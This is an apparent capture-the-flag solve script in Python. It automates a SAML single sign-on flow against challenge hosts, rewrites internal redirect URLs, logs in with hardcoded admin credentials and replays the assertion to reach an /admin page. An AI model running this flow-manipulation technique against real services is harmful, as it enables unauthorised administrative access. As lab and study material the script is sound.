import urllib.request, urllib.parse, http.cookiejar, re, sys, html

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

SP = "http://oj-10-30-15-1-44153.adworld.xctf.org.cn"
IDP = "http://oj-10-30-15-1-56469.adworld.xctf.org.cn"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect)
opener.addheaders = [('User-Agent','Mozilla/5.0')]

def req(url, data=None):
    body = urllib.parse.urlencode(data).encode() if data else None
    r = urllib.request.Request(url, data=body)
    try:
        resp = opener.open(r, timeout=25)
        return resp.getcode(), dict(resp.headers), resp.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode('utf-8','replace')

def fix(url):
    for h in ("http://127.0.0.1:80/", "http://127.0.0.1/", "http://localhost/", "http://idp/"):
        url = url.replace(h, IDP + "/")
    return url

c, h, b = req(SP + "/saml/login")
loc = fix(h.get("Location",""))
c, h, b = req(loc)
q = urllib.parse.parse_qs(urllib.parse.urlparse(h.get("Location","")).query)
samlRequest = q["SAMLRequest"][0]; relayState = q.get("RelayState",["/"])[0]
c, h, b = req(IDP + "/login?" + urllib.parse.urlencode({"SAMLRequest":samlRequest,"RelayState":relayState}))
samlRequest = html.unescape(re.search(r'name="samlRequest"\s+value="([^"]+)"', b).group(1))
relayState = html.unescape(re.search(r'name="relayState"\s+value="([^"]+)"', b).group(1))
c, h, b = req(IDP + "/login", {"samlRequest":samlRequest,"relayState":relayState,"username":"admin","password":"RCTF2025"})
print("login:", c, h.get("Location","")[:40])
sso_loc = h.get("Location","")
sso_url = (IDP + sso_loc) if sso_loc.startswith("/") else fix(sso_loc)
c, h, b = req(sso_url)
print("sso code:", c)
action = re.search(r'action="([^"]+)"', b)
sresp = re.search(r'name="SAMLResponse"\s+value="([^"]+)"', b)
rstate = re.search(r'name="RelayState"\s+value="([^"]+)"', b)
print("ACS action:", action.group(1) if action else None)
acs = action.group(1) if action else (SP + "/saml/acs")
if acs.startswith("/"): acs = SP + acs
acs = acs.replace("http://127.0.0.1:80", SP).replace("http://localhost", SP)
SAMLResponse = html.unescape(sresp.group(1)) if sresp else None
RelayState = html.unescape(rstate.group(1)) if rstate else "/admin"
print("SAMLResponse len:", len(SAMLResponse) if SAMLResponse else 0)
c, h, b = req(acs, {"SAMLResponse":SAMLResponse, "RelayState":RelayState})
print("ACS code:", c, "loc:", h.get("Location"))
print(b[:300])
c, h, b = req(SP + "/admin")
print("ADMIN code:", c)
print(b[:1500])
